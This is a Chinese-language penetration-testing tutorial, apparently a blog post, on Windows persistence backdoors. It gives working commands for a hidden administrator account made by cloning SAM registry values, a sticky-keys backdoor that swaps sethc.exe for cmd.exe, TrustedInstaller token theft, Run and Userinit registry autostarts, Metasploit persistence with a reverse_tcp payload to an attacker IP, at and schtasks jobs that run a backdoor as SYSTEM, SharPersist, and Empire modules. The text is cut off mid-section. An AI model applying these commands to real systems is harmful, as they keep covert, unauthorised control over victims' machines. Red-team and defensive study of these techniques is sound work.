![](https://image.3001.net/images/20201025/1603592572_5f94e17c51215dd37b44d.jpg!small)当我们在渗透过程中通过艰辛的努力终于获取了目标主机权限后，我们接下来要做的往往是在目标机器上创建一个后门来维持住我们所获得的权限，否则一旦目标密码被改变或者漏洞被修补，那么就会导致我们对服务器权限的丢失。有了后门，我们就可以进出内网如若无人之境，所以权限维持的重要性可见一斑。

## Windows 操作系统常见持久性后门

下面，我们先介绍几种常见的 Windows 系统后门，包括Windows系统隐藏用户、Shift粘粘键后门、注册表后门、Windows
计划任务、Windows 新服务后门、WMI后门等等。

![](https://image.3001.net/images/20201104/1604492108_5fa29b4cba4389c9e8579.jpg!small)

## Windows系统隐藏账户

该方法是通过建立隐藏账户，制作系统用户远程控制后门，维持目标Windows系统权限。制作方法跟步骤如下：

（1）在目标主机cmd中输入以下命令，创建一个名为whoami$的隐藏账户，并把该隐藏账户设置为管理员权限。

    
    
    net user whoami$ Liu78963 /add
    net localgroup administrators whoami$ /add

![1603594418_5f94e8b2de4b4299160c7.png!small?1603594419418](https://image.3001.net/images/20201025/1603594418_5f94e8b2de4b4299160c7.png!small?1603594419418)

如上图，我们已经创建成功，执行net user命令，发现是看不到whoami$用户的：

![1603594472_5f94e8e8d06a87c5cff47.png!small?1603594472797](https://image.3001.net/images/20201025/1603594472_5f94e8e8d06a87c5cff47.png!small?1603594472797)

但是这就结束了吗，没有！虽然上面net user看不见该隐藏用户，但是在控制面板和计算机管理的本地用户和组中，仍然是可以看的到该用户的：

![1603594663_5f94e9a7ec25d32a5efc3.png!small?1603594663978](https://image.3001.net/images/20201025/1603594663_5f94e9a7ec25d32a5efc3.png!small?1603594663978)

为了更好地隐藏我们的后门账户，我们还要开启目标主机的远程桌面进行如下操作。

打开注册表编辑器，找到`HKEY_LOCAL_MACHINE\SAM\SAM`，单机右建，选择“权限”，把Administrator用户的权限，设置成“完全控制”权限，然后关闭注册表编辑器，再次打开即可。

![1603594925_5f94eaad965ba49e8f807.png!small?1603594925728](https://image.3001.net/images/20201025/1603594925_5f94eaad965ba49e8f807.png!small?1603594925728)

这样SAM下的文件就都能看见了。

然后，在注册表编辑器的`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names`处，点击Administrator用户，在左侧找到和在右边显示的键值的类型一项“0x1f4”相同的目录名，也就是箭头所指目录“000001F4”：

![1603595456_5f94ecc0a8929859dea9f.png!small?1603595456658](https://image.3001.net/images/20201025/1603595456_5f94ecc0a8929859dea9f.png!small?1603595456658)

复制`000001F4`目录中的F键的值：

![1603595572_5f94ed34aee514da735e3.png!small?1603595572724](https://image.3001.net/images/20201025/1603595572_5f94ed34aee514da735e3.png!small?1603595572724)

然后找到与隐藏账户whoami$右边类型的键值“0x3e9”相同的目录名，也就是。

![1603595699_5f94edb38255cef869458.png!small?1603595699463](https://image.3001.net/images/20201025/1603595699_5f94edb38255cef869458.png!small?1603595699463)

然后将`000001F4`的F值粘贴到`000003E9`的F值中，点击确定：

![1603595867_5f94ee5be472504f50292.png!small?1603595867883](https://image.3001.net/images/20201025/1603595867_5f94ee5be472504f50292.png!small?1603595867883)

然后从注册表中右键导出`000003E9`和whoami$，并删除whoami$用户 net user whoami$ /del：

![1603596035_5f94ef03270db8bfd87dc.png!small?1603596035640](https://image.3001.net/images/20201025/1603596035_5f94ef03270db8bfd87dc.png!small?1603596035640)

![1603596070_5f94ef261cfe970ed171d.png!small?1603596085555](https://image.3001.net/images/20201025/1603596070_5f94ef261cfe970ed171d.png!small?1603596085555)

![1603596143_5f94ef6f269de031a83ac.png!small?1603596143135](https://image.3001.net/images/20201025/1603596143_5f94ef6f269de031a83ac.png!small?1603596143135)

此时，查看注册表以及本地用户和组或者控制面板，whoami$用户已经没有了：

最后，将刚才导出的两个后缀为.reg的注册表项导入注册表中：

![1603596406_5f94f0765dd947291b28b.png!small?1603596406503](https://image.3001.net/images/20201025/1603596406_5f94f0765dd947291b28b.png!small?1603596406503)

这样我们的隐藏账户whoami$就创建好了。现在，不管你是在命令提示符下输入 net user
或者在系统用户管理界面都是看不到whoami$这个账户的，只有在注册表中才能看得到。

## Shift 粘滞键后门

如果你在电脑上连按五次shift键，你就会发现电脑屏幕上弹出了一个叫做“粘滞键”的程序：

![1603596704_5f94f1a0230e0a0d51774.png!small?1603596704101](https://image.3001.net/images/20201025/1603596704_5f94f1a0230e0a0d51774.png!small?1603596704101)

即使在没有登录进系统之前，连按五次shift键也可以弹出这个程序：

![1603597020_5f94f2dc876c1f0538975.png!small?1603597022631](https://image.3001.net/images/20201025/1603597020_5f94f2dc876c1f0538975.png!small?1603597022631)

思考一下，如果我们知道了这个程序的绝对路径，那么我们就可以将cmd.exe伪装成这个粘滞键程序，当我们连按五次shift键时，便会弹出一个CMD命令行窗口，那么我们就可以无需登录进系统便可以控制目标主机了。

粘滞键程序名称为“sethc.exe”，其路径为“c:\windows\system32\sethc.exe”。利用粘滞键做后门是一种比较常见的持续控制方法。其基本流程如下：

  * 首先，我们手动或利用工具，找到sethc.exe将其删除或改名为sethc.exe.bak，接着将cmd.exe程序复制一个副本，并命名为“sethc.exe”。

  * 最后，重启计算机再次按下5次Shift键时，就会弹出CMD界面，后门制作成功。

###  **（1）手动制作**

在目标主机上执行如下命令即可：

    
    
    cd c:\windows\system32  
    move sethc.exe sethc.exe.bak   // 将sethc.exe重命名
    copy cmd.exe sethc.exe       // 将一个cmd.exe副本保存伪装成sethc.exe

![1603598425_5f94f859c2f72ff3b4345.png!small?1603598425915](https://image.3001.net/images/20201025/1603598425_5f94f859c2f72ff3b4345.png!small?1603598425915)

此时，我们打开目标主机的远程桌面，连续按下五次shift键，便可以看到目标主机屏幕上成功弹出了一个CMD窗口：

![1603598482_5f94f892bcfe3aceca9ed.png!small?1603598488055](https://image.3001.net/images/20201025/1603598482_5f94f892bcfe3aceca9ed.png!small?1603598488055)

如上图，该cmd是以system权限运行的，接下来我们就可以无需知道登录密码，无需登录，直接对目标主机执行各种高权限的操作了，也完全可以新建一个高权限用户直接登录进入系统，是不是很有意思？

但是，先别高兴地太早了，在一些做了防护的主机上，即使是SYSTEM权限也是无法修改sethc.exe的：

![1603599210_5f94fb6a957b14083e434.png!small?1603599210561](https://image.3001.net/images/20201025/1603599210_5f94fb6a957b14083e434.png!small?1603599210561)

只有TrustedInstaller权限才可以，这时，我们就要先模拟一个TrustedInstaller权限的令牌获取TrustedInstaller权限，然后再执行上述操作。我们的思路如下：

当我们启动TrustedInstaller服务时会启动进程TrustedInstaller.exe，该程序的权限为NT
SERVICE\TrustedInstaller，那么我们就可以窃取该进程的令牌。

首先进入shell启动TrustedInstaller服务：

    
    
    sc.exe start TrustedInstaller       # 先进入shell启动TrustedInstaller服务

![1603599226_5f94fb7a09b491c22bb55.png!small?1603599226000](https://image.3001.net/images/20201025/1603599226_5f94fb7a09b491c22bb55.png!small?1603599226000)

然后执行如下即可：

    
    
    use incognito  
    ps      # 找到TrustedInstaller的进程PID，这里为3476  
    steal_token <PID>      # 从该进程中窃取令牌  
    getuid   

![1603599275_5f94fbab2d2a13b7f4878.png!small?1603599275112](https://image.3001.net/images/20201025/1603599275_5f94fbab2d2a13b7f4878.png!small?1603599275112)

此时便可以对sethc.exe进行任何操作了：

![1603598425_5f94f859c2f72ff3b4345.png!small](https://image.3001.net/images/20201025/1603598425_5f94f859c2f72ff3b4345.png!small)

###  **（2）Empire 下的利用**

如果你觉得上面的手动操作比较复杂，你可以使用Empire的 lateral_movement/invoke_wmi_debugger模块自动完成以上操作。

> 该模块将为指定的目标（SETHC.exe、Utilman.exe、OSK.exe、DealActudi.exe或Max
> .exe）来设置调试器，使之成为选择的目标（即CMD.exe）或阶段程序。这类似于持久性/调试器模块，但具有远程执行而不是本地执行功能。

![1604919700_5fa9219478abd0e93927a.png!small](https://image.3001.net/images/20201109/1604919700_5fa9219478abd0e93927a.png!small)

假设我们已经在Empire上面获得了目标主机的session，我们可以通过该模块在目标主机上设置粘滞键后门：

    
    
    usemodule lateral_movement/invoke_wmi_debugger  
    set ComputerName <主机名/IP>  
    set TargetBinary sethc.exe  
    execute

如下图所示，我们成功在目标主机上安装了“粘滞键”后门：

![1604919822_5fa9220e54cf15b919967.png!small](https://image.3001.net/images/20201109/1604919822_5fa9220e54cf15b919967.png!small)

## 注册表键后门

该方法是通过将需要执行的后门程序或者攻击脚本路径添加到注册表的自动启动项中，从而实现目标主机启动或登录时便会执行后门程序使我们获得其控制权限。

一般我们使用注册表的如下位置：

    
    
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run   // 开启时启动程序  
    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit   // 登录时启动程序

###  **（1）手动制作**

首先我们制作一个metasploit后门：

![1603600234_5f94ff6a264006abab401.png!small?1603600234106](https://image.3001.net/images/20201025/1603600234_5f94ff6a264006abab401.png!small?1603600234106)

将该后门程序上传到目标主机的C:\Windows\System32目录中：

![1603600302_5f94ffae80b5ce22e14f6.png!small?1603600302425](https://image.3001.net/images/20201025/1603600302_5f94ffae80b5ce22e14f6.png!small?1603600302425)

然后在目标主机的meterpreter执行如下命令注册表进行操作制作后门：

    
    
    reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key  
    reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v backdoor -d 'C:\windows\system32\backdoor.exe' #设置键值  
    reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v backdoor   #查看键值

![1603601884_5f9505dca0df45ed7b181.png!small?1603601885518](https://image.3001.net/images/20201025/1603601884_5f9505dca0df45ed7b181.png!small?1603601885518)

如上图所示，后门创建成功。此时我们重新开一个metasploit监听，然后输入“shutdown -r -t
0”命令让目标主机重启，当目标主机重新启动后便会启动执行backdoor.exe后门程序，我们攻击机的新开的metasploit监听上就会成功上线：

![1603602414_5f9507ee0635619d7fbfa.png!small?1603602420762](https://image.3001.net/images/20201025/1603602414_5f9507ee0635619d7fbfa.png!small?1603602420762)

我们还可以操作注册表的Userinit键：

    
    
    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit

让目标主机在用户进行登陆时，winlogon运行指定的后门程序。

除此之外还有以下可利用的注册表键：

    
    
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce // 只会在开机时启动一次
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices   
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

###  **（2）Metasploit 下的利用**

Metasploit通过使用Meterpreter脚本和后渗透模块来支持通过注册表的持久性。Meterpreter脚本将以VBS脚本的形式创建一个有效payload，该payload将被上传到目标主机的磁盘上，并创建一个注册表项，该注册表项将在用户登录期间循环运行该有效负载。

    
    
    run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.52.129 
    run persistence -X -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.52.129

  * -U指定启动方式为用户登录时自启动
  * -X指定启动的方式为开机自启动
  * -P 指定所使用的payload
  * -i不断尝试反向连接的时间间隔，我们这里设置的是5秒钟执行一次
  * –r指定攻击者的ip
  * -p 指定攻击者监听的端口

![1603604248_5f950f182608f3417a0dc.png!small?1603604248321](https://image.3001.net/images/20201025/1603604248_5f950f182608f3417a0dc.png!small?1603604248321)

如上图所示执行成功，生成后门后，只要目标主机重启或者登录，我们将在特定的时间间隔保持meterpreter会话了。

### （3）Empire 下的利用

在Empire上面有一个persistence/userland/registry后渗透模块，可以自动帮我们完成上面手动创建注册表后门的任务。

![1604920719_5fa9258f1e46053e8c4c7.png!small?1604920720404](https://image.3001.net/images/20201109/1604920719_5fa9258f1e46053e8c4c7.png!small?1604920720404)

假设我们已经在Empire上面获得了一个目标主机的session，我们可以通过设置该模块在目标主机上创建注册表后门：

    
    
    usemodule persistence/userland/registry  
    set Listener <监听名>  
    set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run  
    execute

如下图所示，成功在目标主机上创建后门：

![1604920777_5fa925c9e97058920770f.png!small?1604920776634](https://image.3001.net/images/20201109/1604920777_5fa925c9e97058920770f.png!small?1604920776634)

 **注意：杀毒软件针对此类注册表后门有专门的查杀机制。**

## Windows 计划任务后门

计划任务可以让目标主机在特定的时间执行我们预先准备的后门程序从而使我们获得目标系统的控制权。计划任务的持久化技术可以手动实现，也可以自动实现。有效负载可以从磁盘或远程位置执行，它们可以是可执行文件、powershell脚本或scriptlet的形式。

###  **（1）利用 at 命令**

at 命令是Windows自带的用于创建计划任务的命令，但是他主要工作在Windows Server
2008之前版本的操作系统中。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。

1\. 首先在目标主机上传metasploit生成的后门程序：

![1603605135_5f95128f5471c6a058f19.png!small?1603605135298](https://image.3001.net/images/20201025/1603605135_5f95128f5471c6a058f19.png!small?1603605135298)

2\. 然后进入目标主机的shell使用net time命令确定目标主机的当前时间：

    
    
    net time

![1603609183_5f95225f6e89a7efe81b4.png!small?1603609183395](https://image.3001.net/images/20201025/1603609183_5f95225f6e89a7efe81b4.png!small?1603609183395)

3\. 接着在目标主机的shell中使用at命令创建计划任务，让目标主机在指定的时间运行metasploit木马程序：

    
    
    at 15:01:00 /every:M,T,W,Th,F c:\windows\system32\backdoor.exe

![1603609220_5f95228418a8fd454bef0.png!small?1603609220061](https://image.3001.net/images/20201025/1603609220_5f95228418a8fd454bef0.png!small?1603609220061)

如上图所示，计划任务创建成功，目标主机将在每个工作日的15:01:00执行后门程序，我们便可以在这个时间获得目标机器的控制权：

![1603609306_5f9522da119d12e426741.png!small?1603609312089](https://image.3001.net/images/20201025/1603609306_5f9522da119d12e426741.png!small?1603609312089)

###  **（2）利用 schtasks 命令**

上面我们讲了用at命令创建计划任务，但是该命令已经被Windows Vista、Windows Server
2008及之后版本的操作系统废弃了，代替他的是schtasks命命令。schtasks命令比at命令更为灵活、自由。下面来演示schtasks命令的使用，于是，攻击者开始使用schtasks命令来代替at命令。

利用schtasks创建后门的大致流程如下：

1\. 首先在目标主机上传metasploit生成的后门程序。

2\.
然后在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的backdoor.exe，启动权限为system。命令如下：

    
    
    schtasks /create /tn backdoor /sc minute /mo 1  /tr c:\windows\system32\backdoor.exe /ru system /f

![1603610327_5f9526d7d9ecc3cf38aab.png!small?1603610327819](https://image.3001.net/images/20201025/1603610327_5f9526d7d9ecc3cf38aab.png!small?1603610327819)

然后新开一个metasploit监听，等待一分钟后这个监听便收到了目标主机的session：

![1603610417_5f9527311484cdfbcfe19.png!small?1603610423560](https://image.3001.net/images/20201025/1603610417_5f9527311484cdfbcfe19.png!small?1603610423560)

并且这个session还是system权限的。

### （3）利用SharPersist工具

下载地址：<https://github.com/fireeye/SharPersist/releases>

<https://github.com/fireeye/SharPersist>

SharPersist的创建是为了帮助使用多种不同的技术在Windows操作系统上建立持久性。它是一个国外安全人员用C#编写的命令行工具，可以反射性的加载Cobalt
Strike的“execute-assembly”命令或任何其他支持反射性加载.NET程序集的框架。SharPersist采用模块化设计，以便将来添加新的持久性技术。还有一些与tradecraft相关的项已经内置到该工具及其支持的持久性技术中，例如file
time stomping策略和最小化或隐藏运行应用程序。

该工具支持的持久性技术有：

  * `keepass`-keepass配置文件后门
  * `reg`-注册表项添加/修改
  * `schtaskbackdoor`-通过向后门计划任务添加其他操作来完成该任务
  * `startupfolder`-启动文件夹中的lnk文件
  * `tortoisesvn`-乌龟svn钩子脚本
  * `service`-创建新的Windows服务
  * `schtask`-创建新的计划任务

如果用户具有管理员级别的特权，则可以通过SharPersist工具创建一个新的计划任务，该任务将在Windows登录期间执行我们上传好的有效载荷。

1\. 在目标主机上传我们新生成的metasploit木马和SharPersist程序：

![1604206659_5f9e4043e7078a4dcede1.png!small?1604206661110](https://image.3001.net/images/20201101/1604206659_5f9e4043e7078a4dcede1.png!small?1604206661110)

2\. 然后使用以下命令创建我们恶意的计划任务：

    
    
    SharPersist.exe -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c C:\Users\Administrator\backdoor2.exe" -n "backdoor2" -m add -o logon

![1604206880_5f9e41203f591b2be1064.png!small?1604206882388](https://image.3001.net/images/20201101/1604206880_5f9e41203f591b2be1064.png!small?1604206882388)

然后新开一个metasploit监听，等待目标主机重启后便可以收到目标主机的session，并且还是system权限的：

![1604207103_5f9e41ff50206da04657f.png!small?1604207110014](https://image.3001.net/images/20201101/1604207103_5f9e41ff50206da04657f.png!small?1604207110014)

### （4）Empire 下的利用

Windows计划任务后门我们可以用Empire上的persistence/elevated/schtasks后渗透模块在目标主机上进行设置。

![](https://image.3001.net/images/20201109/1604921133_)

